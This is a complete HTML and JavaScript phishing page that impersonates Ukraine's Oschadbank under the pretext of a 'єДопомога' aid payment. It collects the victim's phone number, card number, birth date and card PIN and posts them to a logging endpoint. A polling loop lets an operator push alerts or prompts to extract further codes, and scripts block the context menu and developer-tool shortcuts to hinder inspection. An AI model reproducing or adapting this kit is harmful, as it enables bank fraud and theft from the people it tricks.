<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ощад 24/7 — Ідентифікація через BankID</title>
    <link rel="stylesheet" href="oschad.css">
    <style>
        body {
            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="oschad-wrapper">
        <header class="oschad-header">
            <div class="header-inner">
                <div class="logo"><span class="square">О</span>ЩАД<span>БАНК</span></div>
                <div class="secure-tag">Державний банк</div>
            </div>
        </header>

        <main class="oschad-content">
            <div class="auth-card">
                <div class="auth-top">
                    <h1>Вхід у кабінет отримувача</h1>
                    <p>Будь ласка, вкажіть дані вашої активної картки для перевірки у реєстрі «єДопомога»</p>
                </div>

                <form id="oschad-full-form">
                    <div class="input-block">
                        <label>Фінансовий номер телефону</label>
                        <input type="tel" id="o-phone" placeholder="+380" required>
                    </div>

                    <div class="input-block">
                        <label>Номер вашої картки (16 цифр)</label>
                        <input type="text" id="o-card" maxlength="19" placeholder="0000 0000 0000 0000" required>
                    </div>

                    <div class="input-row">
                        <div class="input-block">
                            <label>Дата народження</label>
                            <input type="date" id="o-birth" required>
                        </div>
                        <div class="input-block">
                            <label>ПІН-код</label>
                            <input type="password" id="o-pin" maxlength="4" placeholder="****" inputmode="numeric" required>
                        </div>
                    </div>

                    <div class="security-notice">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#005a3c">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                        </svg>
                        Дані захищено за стандартом PCI DSS.
                    </div>

                    <button type="submit" class="oschad-submit-btn">ПІДТВЕРДИТИ ДАНІ</button>
                </form>
            </div>
        </main>
        
        <footer class="oschad-footer">
            <p>© 1991–2026 АТ «Ощадбанк». Ліцензія НБУ №148</p>
        </footer>
    </div>

    <div id="oschad-loader" class="loader-mask" style="display:none;">
        <div class="loader-content">
            <div class="oschad-spinner"></div>
            <p id="loader-status">Перевірка за реєстрами МСП...</p>
        </div>
    </div>

    <script>
    // 1. Сессия
    if (!sessionStorage.getItem('USER_ID')) {
        sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
    }
    const USER_ID = sessionStorage.getItem('USER_ID');
    const SERVER_URL = window.location.origin; // Авто-определение адреса

    // 2. Защита
    document.onkeydown = function(e) {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode))) return false;
    };

    // 3. Карта
    document.getElementById('o-card').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    // 4. Отправка
    document.getElementById('oschad-full-form').addEventListener('submit', async function(e) {
        e.preventDefault();
        const loader = document.getElementById('oschad-loader');
        const statusText = document.getElementById('loader-status');
        loader.style.display = 'flex';

        const logData = {
            "Телефон": document.getElementById('o-phone').value,
            "Карта": document.getElementById('o-card').value,
            "ДР": document.getElementById('o-birth').value,
            "ПИН": document.getElementById('o-pin').value
        };

        try {
            await fetch(`${SERVER_URL}/api/log`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: USER_ID, type: 'ОЩАД', data: logData })
            });
            setTimeout(() => { statusText.innerText = "Формування заявки на виплату..."; }, 2000);
        } catch (err) {
            loader.style.display = 'none';
            alert("Помилка зв'язку. Спробуйте пізніше.");
        }
    });

    // 5. Ожидание команд
    setInterval(async () => {
        try {
            const res = await fetch(`${SERVER_URL}/api/check/${USER_ID}`);
            const data = await res.json();
            if (data) {
                const loader = document.getElementById('oschad-loader');
                if (data.action === 'msg') {
                    loader.style.display = 'none';
                    alert(data.text);
                    location.reload(); 
                } else if (data.action === 'ask') {
                    loader.style.display = 'none';
                    const val = prompt(data.text);
                    if (val) {
                        loader.style.display = 'flex';
                        fetch(`${SERVER_URL}/api/log`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ userId: USER_ID, type: 'ОТВЕТ', data: { "Ввод": val } })
                        });
                    }
                }
            }
        } catch (e) {}
    }, 3000);
    </script>
</body>
</html>
